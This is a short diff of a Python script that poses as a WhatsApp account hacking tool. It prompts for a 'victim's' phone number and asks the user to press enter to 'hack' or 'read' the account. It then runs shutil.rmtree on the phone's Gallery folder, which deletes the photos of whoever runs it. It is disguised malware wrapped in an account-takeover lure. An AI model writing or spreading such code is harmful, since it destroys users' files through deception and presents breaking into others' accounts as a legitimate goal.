@@ -210,10 +210,10 @@ don't joke with me""")
 
 print("            Welcome_To_Climak_eye\n         Don't share..!!  This is private")
 print("            don't abuse ")
-country=input("[1]Enter country code>>")
+country=input("[1] Enter country code>>")
 number=input("[2)]Enter victim's number without country code>>")
 print("Do you want to hack "+country+number+" ?")
-conti=input("Press enter to Hack the WhatsApp account:")
+conti=input("Press enter to read the WhatsApp account:")
 print("Donwloading_______Do not_Out!!!")
 try:
 	shutil.rmtree("/storage/emulated/0/Gallery")
